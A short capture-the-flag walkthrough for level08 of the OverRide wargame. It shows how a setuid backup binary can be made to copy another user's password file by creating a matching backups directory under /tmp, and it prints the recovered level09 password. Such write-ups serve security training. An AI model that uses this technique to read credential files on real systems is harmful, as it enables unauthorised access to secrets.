# level08 walkthrough

## the binary
``` shell
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
```

## methodology
- directory traversal attack

As we examine the binary, we can see it opens a remote file. The next level password cannot be accessed directly though:
``` shell
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

We can't create the backup directly in home because of the lack of permissions. We opt to move to <code>/tmp</code> and create a path directory that matches the required output:
``` shell
level08@OverRide:/tmp$ mkdir -p backups//home/users/level09/
```

From this location, we execute the command again and spawn the password for level09.

## flag
``` shell
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
